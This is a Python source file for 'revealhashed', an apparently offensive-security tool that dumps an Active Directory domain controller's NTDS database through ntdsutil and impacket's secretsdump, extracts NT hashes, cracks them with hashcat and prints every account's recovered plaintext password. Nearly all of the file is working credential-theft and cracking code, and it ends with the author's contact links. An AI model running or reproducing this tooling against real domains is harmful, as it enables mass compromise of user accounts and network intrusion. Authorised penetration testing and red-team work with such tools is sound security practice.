#!/usr/bin/env python3

import argparse
import os
import re
import subprocess
import shutil
import sys
import csv
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from contextlib import redirect_stdout

# zblurx's ntdsutil.py
from revealhashed.imports import ntdsutil
from revealhashed.imports.ntdsutil import get_ntdsutil_parser, run_ntdsutil

# ntds class
from impacket.examples.secretsdump import NTDSHashes, LocalOperations

# constants
HOME = Path.home()
TMP_DIR = HOME / ".revealhashed"
HASHCAT_POT = HOME / ".local" / "share" / "hashcat" / "hashcat.potfile"

# ansi colors
BOLD_BLUE = "\033[1;34m"
BOLD_GREEN = "\033[1;32m"
BOLD_ORANGE = "\033[1;33m"
BOLD_RED = "\033[1;31m"
BOLD_WHITE = "\033[1;37m"
RESET = "\033[0m"

def parse_args():
    parser = argparse.ArgumentParser(
        description=""
    )

    parser.add_argument("-r", "--reset", action="store_true", help="Delete old files in ~/.revealhashed")

    subparsers = parser.add_subparsers(dest="command")
    # subparser: dump
    dump_parser = subparsers.add_parser("dump", help="Dump NTDS using ntdsutil then reveal credentials with it")
    dump_parser.add_argument("target", help="Target for NTDS dumping (e.g. domain/user:pass@host)")
    dump_parser.add_argument("-debug", action="store_true")
    dump_parser.add_argument("-hashes")
    dump_parser.add_argument("-no-pass", action="store_true")
    dump_parser.add_argument("-k", action="store_true")
    dump_parser.add_argument("-aesKey")
    dump_parser.add_argument("-dc-ip")
    dump_parser.add_argument("-codec")
    dump_parser.add_argument("-w", "--wordlists", nargs="+", metavar="WORDLIST WORDLIST2", help="Wordlists to use with hashcat", required=True)
    dump_parser.add_argument("-e", "--enabled-only", action="store_true", help="Only show enabled accounts")
    dump_parser.add_argument('-nd', '--no-domain', action='store_true', help="Don't display domain in usernames")
    dump_parser.add_argument('-csv', action='store_true', help="Save output in CSV format")
    # do not include -outputdir
    
    # subparser: reveal
    reveal_parser = subparsers.add_parser("reveal", help="Use your own NTDS dump then reveal credentials with it")
    reveal_parser.add_argument("-ntds", help="Path to .ntds file")
    reveal_parser.add_argument("-nxc", action="store_true", help="Scan $HOME/.nxc/logs/ntds for .ntds files")
    reveal_parser.add_argument("-w", "--wordlists", nargs="+", metavar="WORDLIST WORDLIST2", help="Wordlists to use with hashcat", required=False)
    reveal_parser.add_argument("-e", "--enabled-only", action="store_true", help="Only show enabled accounts")
    reveal_parser.add_argument('-nd', '--no-domain', action='store_true', help="Don't display domain in usernames")
    reveal_parser.add_argument('-csv', action='store_true', help="Save output in CSV format")

    return parser

def reset_tmp_dir():
    temp_dir = Path.home() / ".revealhashed"
    if temp_dir.exists():
        print(f"{BOLD_RED}[!]{RESET} Deleting old session data in {temp_dir}")
        shutil.rmtree(temp_dir)
    else:
        print(f"{BOLD_GREEN}[+]{RESET} No previous session data found.")

def create_session_dir():
    now = datetime.now().strftime("%d%m_%H%M%S")
    session_path = TMP_DIR / f"rh_{now}"
    session_path.mkdir(parents=True, exist_ok=True)
    return session_path

def extract_unique_hashes(ntds_path, output_path, full_output_path, write_full_output=True):
    print(f"{BOLD_GREEN}[+]{RESET} Extracting unique NT hashes from: {ntds_path}")
    seen_hashes = set()
    line_regex = re.compile(r"^[^:\n]+:\d+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}")

    try:
        with open(ntds_path, "r") as infile, \
             open(output_path, "w") as rh2file, \
             (open(full_output_path, "w") if write_full_output else open(os.devnull, "w")) as indfile:

            for line in infile:
                if write_full_output:
                    indfile.write(line)

                if not line_regex.match(line.strip()):
                    continue  # skip irrelevant lines

                parts = line.strip().split(":")
                if len(parts) >= 4:
                    nt_hash = parts[3]
                    if re.fullmatch(r"[0-9a-fA-F]{32}", nt_hash) and nt_hash not in seen_hashes:
                        seen_hashes.add(nt_hash)
                        rh2file.write(nt_hash + "\n")

    except FileNotFoundError:
        print(f"{BOLD_RED}[!]{RESET} File not found: {ntds_path}")
        raise

def run_hashcat(hashes_file, wordlists):
    start = datetime.now().strftime("%H:%M:%S %d.%m.%Y")
    print(f"\n{BOLD_GREEN}[+]{RESET} Starting hashcat session at {start}")
    subprocess.run(["hashcat", "-m1000", str(hashes_file), *wordlists, "--quiet"])
    end = datetime.now().strftime("%H:%M:%S %d.%m.%Y")
    print(f"{BOLD_GREEN}[+]{RESET} Ended hashcat session at {end}")

def parse_potfile(potfile_path):
    cracked = {}
    if not potfile_path.exists():
        return cracked
    with open(potfile_path, "r") as f:
        for line in f:
            parts = line.strip().split(":", 1)
            if len(parts) == 2:
                hash_val, password = parts
                cracked[hash_val] = password
    return cracked

def reveal_credentials(individual_ntds_path, cracked_hashes, session_dir, enabled_only=False, no_domain=False, to_csv=False):
    print(f"\n{BOLD_GREEN}[+]{RESET} Revealed credentials:")
    output_lines = []

    grouped = defaultdict(list)

    with open(individual_ntds_path, "r") as f:
        for line in f:
            parts = line.strip().split(":")
            if len(parts) < 4:
                continue

            user = parts[0]
            nt_hash = parts[3].lower()

            # determine account status
            status_match = re.search(r"\(status=(\w+)\)", line)
            status = status_match.group(1).lower() if status_match else "enabled"

            if nt_hash not in cracked_hashes and nt_hash != "31d6cfe0d16ae931b73c59d7e0c089c0":
                continue
            if enabled_only and status != "enabled":
                continue

            if nt_hash == "31d6cfe0d16ae931b73c59d7e0c089c0":
                password_key = "<no password>"
                password_colored = f"{BOLD_ORANGE}<no password>{RESET}"
            else:
                plain = cracked_hashes[nt_hash]
                password_key = plain
                password_colored = f"{BOLD_WHITE}{plain}{RESET}"

            # strip domain if requested
            display_user = user.split("\\", 1)[-1] if no_domain else user

            disabled_str = f"{BOLD_RED}<disabled>{RESET}" if status == "disabled" else ""
            line_out = f"{display_user:<40} {password_colored}{' ' + disabled_str if status == 'disabled' else ''}"
            output_lines.append((password_key, display_user, line_out, status))

    # sort: <no password> first, then alphabetically
    output_lines.sort(key=lambda x: (x[0] != "<no password>", x[0].lower(), x[1].lower()))

    # print and write
    for _, _, line_out, _ in output_lines:
        print(line_out)

    if to_csv:
        output_file = session_dir / "revealhashed.csv"
        with open(output_file, "w", newline="") as outf:
            writer = csv.writer(outf)
            writer.writerow(["Username", "Password", "Status"])
            for password_key, user, _, status in output_lines:
                stat = "disabled" if status == "disabled" else ""
                writer.writerow([user, password_key, stat])
    else:
        output_file = session_dir / "revealhashed.txt"
        with open(output_file, "w") as outf:
            for password_key, user, _, status in output_lines:
                status_str = " <disabled>" if status == "disabled" else ""
                outf.write(f"{user:<40} {password_key}{status_str}\n")

    print(f"\n{BOLD_GREEN}[+]{RESET} Output saved to {output_file}")

def main():
    print(f"\n{BOLD_BLUE}revealhashed v0.1.3{RESET}\n")

    parser = parse_args()
    args = parser.parse_args()

    if not vars(args).get("command") and not args.reset:
        parser.print_help()
        sys.exit(0)

    if args.reset:
        reset_tmp_dir()
        return  # exit after resetting, no further processing

    if args.command == "dump":
        session_dir = create_session_dir()
        rh2_path = session_dir / "rh2cracked.txt"
        ind_path = session_dir / "individual.ntds"
        ntdsutil_dir = session_dir / "ntdsutil"
        ntdsutil_dir.mkdir(parents=True, exist_ok=True)
        args.outputdir = str(ntdsutil_dir)
        start = datetime.now().strftime("%H:%M:%S %d.%m.%Y")
        print(f"{BOLD_GREEN}[+]{RESET} Starting NTDS dump with ntdsutil at {start}")

        try:
            ntdsutil.run_ntdsutil(args)
        except Exception as e:
            print(f"{BOLD_RED}[!]{RESET} NTDS dump failed: {e}")
            return
            
        end = datetime.now().strftime("%H:%M:%S %d.%m.%Y")
        print(f"{BOLD_GREEN}[+]{RESET} NTDS successfully dumped at {end}")

        # run secretsdump in the same session folder
        system_path = ntdsutil_dir / "SYSTEM"
        security_path = ntdsutil_dir / "SECURITY"
        ntds_path = ntdsutil_dir / "ntds.dit"
        output_path = session_dir / "dump.ntds"

        if not (system_path.exists() and security_path.exists() and ntds_path.exists()):
            print(f"{BOLD_RED}[!]{RESET} Missing NTDS, SYSTEM, or SECURITY file")
            return

        print(f"{BOLD_GREEN}[+]{RESET} Running secretsdump on NTDS files")
        try:
            local_ops = LocalOperations(str(system_path))
            boot_key = local_ops.getBootKey()

            with open(os.devnull, 'w') as fnull, redirect_stdout(fnull):
                ntds = NTDSHashes(
                    str(ntds_path),
                    boot_key,
                    isRemote=False,
                    history=False,
                    noLMHash=True,
                    remoteOps=None,
                    useVSSMethod=True,
                    justNTLM=True,
                    pwdLastSet=False,
                    resumeSession=None,
                    outputFileName=str(session_dir / "dump"),
                    justUser=None,
                    skipUser=None,
                    ldapFilter=None,
                    printUserStatus=True
                )
                ntds.dump()
                ntds.finish()

        except Exception as e:
            print(f"{BOLD_RED}[!]{RESET} secretsdump failed: {e}")

        print(f"{BOLD_GREEN}[+]{RESET} secretsdump output saved to {output_path}")

        line_regex = re.compile(r"^[^:\n]+:\d+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}")
        with open(output_path, "r") as infile, open(ind_path, "w") as outfile:
            for line in infile:
                if line_regex.match(line.strip()):
                    outfile.write(line)

        try:
            extract_unique_hashes(ind_path, rh2_path, ind_path, write_full_output=False)
        except FileNotFoundError:
            return

        run_hashcat(rh2_path, args.wordlists)

        if HASHCAT_POT.exists():
            shutil.copy(HASHCAT_POT, session_dir)
        cracked = parse_potfile(HASHCAT_POT)
        reveal_credentials(ind_path, cracked, session_dir, enabled_only=args.enabled_only, no_domain=args.no_domain, to_csv=args.csv)

    elif args.command == "reveal":
        if args.nxc:
            nxc_dir = Path.home() / ".nxc" / "logs" / "ntds"
            ntds_files = sorted(nxc_dir.glob("*.ntds"))

            if not ntds_files:
                print(f"{BOLD_RED}[!]{RESET} No .ntds files found in {nxc_dir}")
                sys.exit(1)

            print(f"{BOLD_GREEN}[+]{RESET} Found {len(ntds_files)} .ntds files in {nxc_dir}")
            for idx, f in enumerate(ntds_files):
                print(f"[{idx}] {f.name}")

            while True:
                try:
                    selection = int(input(f"\n{BOLD_GREEN}[>]{RESET} Select file by index: "))
                    print()
                    if 0 <= selection < len(ntds_files):
                        ntds_path = ntds_files[selection]
                        args.ntds = str(ntds_path)
                        break
                    else:
                        print(f"\n{BOLD_RED}[!]{RESET} Invalid selection. Try again.")
                except ValueError:
                    print(f"\n{BOLD_RED}[!]{RESET} Please enter a valid number.")
        else:
            if not args.ntds:
                print(f"{BOLD_RED}[!]{RESET} Please specify either -ntds or -nxc")
                sys.exit(1)
            ntds_path = Path(args.ntds)
        if not args.wordlists:
            print(f"\n{BOLD_RED}[!]{RESET} No wordlists provided. Use -w to specify at least one wordlist.")
            return

        TMP_DIR.mkdir(parents=True, exist_ok=True)
        session_dir = create_session_dir()
        rh2_path = session_dir / "rh2cracked.txt"
        ind_path = session_dir / "individual.ntds"

        try:
            extract_unique_hashes(args.ntds, rh2_path, ind_path)
        except FileNotFoundError:
            return

        run_hashcat(rh2_path, args.wordlists)

        if HASHCAT_POT.exists():
            shutil.copy(HASHCAT_POT, session_dir)
        cracked = parse_potfile(HASHCAT_POT)
        reveal_credentials(ind_path, cracked, session_dir, enabled_only=args.enabled_only, no_domain=args.no_domain, to_csv=args.csv)

if __name__ == "__main__":
    main()

# revealhashed v0.1.3
# 
# contact options
# mail: https://blog.zurrak.com/contact.html
# twitter: https://twitter.com/tasiyanci
# linkedin: https://linkedin.com/in/aslanemreaslan